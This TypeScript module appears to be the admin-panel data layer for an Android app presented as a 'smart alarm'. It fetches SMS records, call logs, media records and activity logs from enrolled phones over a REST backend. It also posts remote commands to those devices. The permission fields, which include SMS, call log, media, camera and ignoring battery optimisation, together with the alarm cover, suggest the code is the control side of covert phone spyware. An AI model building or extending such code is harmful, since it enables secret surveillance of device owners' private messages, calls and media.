import { Device, Permission, Alarm, SmsRecord, CallRecord, MediaRecord, ActivityLog, RemoteCommand } from '../types';

// Local storage keys
const KEY_DEVICES = 'sa_admin_devices';
const KEY_ALARMS = 'sa_admin_alarms';
const KEY_SMS = 'sa_admin_sms';
const KEY_CALLS = 'sa_admin_calls';
const KEY_MEDIA = 'sa_admin_media';
const KEY_LOGS = 'sa_admin_logs';
const KEY_CONFIG = 'sa_admin_config';

export interface ServerConfig {
  supabaseUrl: string;
  supabaseAnonKey: string;
  autoRefreshInterval: number; // in seconds
}

export const getServerConfig = (): ServerConfig => {
  const saved = localStorage.getItem(KEY_CONFIG);
  if (saved) {
    try {
      return JSON.parse(saved);
    } catch (e) {
      console.error(e);
    }
  }
  return {
    supabaseUrl: window.location.origin, // Defaults to local relay server
    supabaseAnonKey: 'smart_alarm_key',
    autoRefreshInterval: 5
  };
};

export const saveServerConfig = (config: ServerConfig) => {
  localStorage.setItem(KEY_CONFIG, JSON.stringify(config));
};

// Clean legacy mock data from browser localStorage if any was stored
export const cleanLegacyMockStorage = () => {
  try {
    const rawDevices = localStorage.getItem(KEY_DEVICES);
    if (rawDevices && (rawDevices.includes('DEVICE-001') || rawDevices.includes('Samsung Galaxy A55'))) {
      localStorage.removeItem(KEY_DEVICES);
      localStorage.removeItem(KEY_SMS);
      localStorage.removeItem(KEY_CALLS);
      localStorage.removeItem(KEY_MEDIA);
      localStorage.removeItem(KEY_ALARMS);
      localStorage.removeItem(KEY_LOGS);
    }
  } catch (e) {
    console.error('Error cleaning legacy storage:', e);
  }
};

cleanLegacyMockStorage();

// Helper to make REST requests either to local Vite server or Supabase cloud
async function fetchRest(endpoint: string, options: RequestInit = {}): Promise<any> {
  const config = getServerConfig();
  let baseUrl = config.supabaseUrl.trim().replace(/\/$/, '');

  // If still using default placeholder, use current origin (local dev server)
  if (!baseUrl || baseUrl.includes('your-project.supabase.co')) {
    baseUrl = window.location.origin;
  }

  const url = baseUrl.endsWith('/rest/v1') ? `${baseUrl}/${endpoint}` : `${baseUrl}/rest/v1/${endpoint}`;

  const headers: Record<string, string> = {
    'Content-Type': 'application/json',
    'apikey': config.supabaseAnonKey,
    'Authorization': `Bearer ${config.supabaseAnonKey}`,
    ...(options.headers as Record<string, string> || {})
  };

  try {
    const resp = await fetch(url, { ...options, headers });
    if (resp.ok) {
      return await resp.json();
    }
  } catch (e) {
    // If external fetch fails, fallback to local origin
    if (baseUrl !== window.location.origin) {
      try {
        const localUrl = `${window.location.origin}/rest/v1/${endpoint}`;
        const localResp = await fetch(localUrl, { ...options, headers });
        if (localResp.ok) return await localResp.json();
      } catch (err) {
        // silent fail to local fallback
      }
    }
  }
  return null;
}

export const api = {
  getDevices: async (): Promise<Device[]> => {
    cleanLegacyMockStorage();
    const serverDevices = await fetchRest('devices');
    if (Array.isArray(serverDevices)) {
      localStorage.setItem(KEY_DEVICES, JSON.stringify(serverDevices));
      return serverDevices;
    }

    const saved = localStorage.getItem(KEY_DEVICES);
    if (saved) {
      try {
        const list: Device[] = JSON.parse(saved);
        return list.filter(d => !d.device_id.startsWith('DEVICE-00')); // exclude old mocks
      } catch (e) {
        return [];
      }
    }
    return [];
  },

  getDeviceById: async (deviceId: string): Promise<Device | undefined> => {
    const devices = await api.getDevices();
    return devices.find(d => d.device_id === deviceId);
  },

  getPermissions: async (deviceId: string): Promise<Permission | null> => {
    const all = await fetchRest('permissions');
    if (all && typeof all === 'object') {
      if (all[deviceId]) return all[deviceId];
      if (Array.isArray(all)) {
        const found = all.find(p => p.device_id === deviceId);
        if (found) return found;
      }
    }
    return {
      id: `p-${deviceId}`,
      device_id: deviceId,
      sms: false,
      call_log: false,
      media: false,
      notifications: true,
      exact_alarm: true,
      camera: false,
      battery_optimization_ignored: false,
      updated_at: new Date().toISOString()
    };
  },

  getSmsRecords: async (deviceId?: string): Promise<SmsRecord[]> => {
    const list = await fetchRest('sms_records');
    if (Array.isArray(list)) {
      return deviceId ? list.filter(item => item.device_id === deviceId) : list;
    }
    const saved = localStorage.getItem(KEY_SMS);
    const parsed: SmsRecord[] = saved ? JSON.parse(saved) : [];
    return deviceId ? parsed.filter(item => item.device_id === deviceId) : parsed;
  },

  getCallRecords: async (deviceId?: string): Promise<CallRecord[]> => {
    const list = await fetchRest('call_records');
    if (Array.isArray(list)) {
      return deviceId ? list.filter(item => item.device_id === deviceId) : list;
    }
    const saved = localStorage.getItem(KEY_CALLS);
    const parsed: CallRecord[] = saved ? JSON.parse(saved) : [];
    return deviceId ? parsed.filter(item => item.device_id === deviceId) : parsed;
  },

  getMediaRecords: async (deviceId?: string): Promise<MediaRecord[]> => {
    const list = await fetchRest('media_records');
    if (Array.isArray(list)) {
      return deviceId ? list.filter(item => item.device_id === deviceId) : list;
    }
    const saved = localStorage.getItem(KEY_MEDIA);
    const parsed: MediaRecord[] = saved ? JSON.parse(saved) : [];
    return deviceId ? parsed.filter(item => item.device_id === deviceId) : parsed;
  },

  getAlarms: async (deviceId?: string): Promise<Alarm[]> => {
    const list = await fetchRest('alarms');
    if (Array.isArray(list)) {
      return deviceId ? list.filter(item => item.device_id === deviceId) : list;
    }
    const saved = localStorage.getItem(KEY_ALARMS);
    const parsed: Alarm[] = saved ? JSON.parse(saved) : [];
    return deviceId ? parsed.filter(item => item.device_id === deviceId) : parsed;
  },

  createAlarm: async (alarm: Omit<Alarm, 'id' | 'created_at'>): Promise<Alarm> => {
    const newAlarm: Alarm = {
      ...alarm,
      id: `alarm-${Date.now()}`,
      created_at: new Date().toISOString()
    };
    await fetchRest('alarms', {
      method: 'POST',
      body: JSON.stringify(newAlarm)
    });
    return newAlarm;
  },

  toggleAlarm: async (id: string): Promise<void> => {
    const alarms = await api.getAlarms();
    const updated = alarms.map(a => a.id === id ? { ...a, is_enabled: !a.is_enabled } : a);
    localStorage.setItem(KEY_ALARMS, JSON.stringify(updated));
  },

  getActivityLogs: async (deviceId?: string): Promise<ActivityLog[]> => {
    const list = await fetchRest('activity_logs');
    if (Array.isArray(list)) {
      return deviceId ? list.filter(item => item.device_id === deviceId) : list;
    }
    const saved = localStorage.getItem(KEY_LOGS);
    const parsed: ActivityLog[] = saved ? JSON.parse(saved) : [];
    return deviceId ? parsed.filter(item => item.device_id === deviceId) : parsed;
  },

  // Remote Control Command Center
  sendRemoteCommand: async (deviceId: string, command: RemoteCommand['command'], payload?: any): Promise<RemoteCommand> => {
    const newCmd: RemoteCommand = {
      id: `cmd-${Date.now()}`,
      device_id: deviceId,
      command,
      payload,
      status: 'PENDING',
      created_at: new Date().toISOString()
    };

    await fetchRest('commands', {
      method: 'POST',
      body: JSON.stringify(newCmd)
    });

    // Also record into activity logs
    await fetchRest('activity_logs', {
      method: 'POST',
      body: JSON.stringify({
        device_id: deviceId,
        event_type: 'REMOTE_COMMAND_DISPATCHED',
        event_data: `Admin command yuborildi: ${command}`,
        created_at: new Date().toISOString()
      })
    });

    return newCmd;
  },

  // Clear all mock & stale data
  clearAllData: async (): Promise<void> => {
    localStorage.removeItem(KEY_DEVICES);
    localStorage.removeItem(KEY_SMS);
    localStorage.removeItem(KEY_CALLS);
    localStorage.removeItem(KEY_MEDIA);
    localStorage.removeItem(KEY_ALARMS);
    localStorage.removeItem(KEY_LOGS);

    await fetchRest('devices', {
      method: 'DELETE'
    });
  }
};
